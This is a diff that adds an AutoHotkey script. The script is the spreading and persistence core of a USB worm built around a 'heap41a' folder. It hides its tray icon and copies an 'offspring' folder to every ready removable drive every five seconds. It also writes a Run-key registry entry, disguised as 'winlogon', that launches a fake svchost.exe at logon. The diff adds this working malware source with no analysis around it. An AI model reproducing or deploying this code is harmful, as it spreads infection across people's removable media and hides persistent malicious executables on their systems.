@@ -1,0 +1,34 @@
+#notrayicon
+#persistent
+ArrayCount = 0
+Loop, Read,C:\heap41a\driveList.txt
+{
+    ArrayCount += 1
+    Array%ArrayCount% := A_LoopReadLine
+}
+dat1=%userprofile%
+settimer,reproduce,5000
+return
+
+reproduce:
+
+Loop %ArrayCount%
+{
+
+    element := Array%A_Index%
+    driveget,data,Type,%element%:\
+    ifequal,data,Removable
+     {
+     driveget,data1,status,%element%:\
+      ifequal,data1,Ready
+      {
+        FileCopydir,C:\heap41a\offspring,%element%:\,1
+
+      }
+
+     }
+}
+regread,regdata,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,winlogon
+ifnotequal,regdata,C:\heap41a\svchost.exe C:\heap41a\std.txt
+Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,winlogon,C:\heap41a\svchost.exe C:\heap41a\std.txt
+return
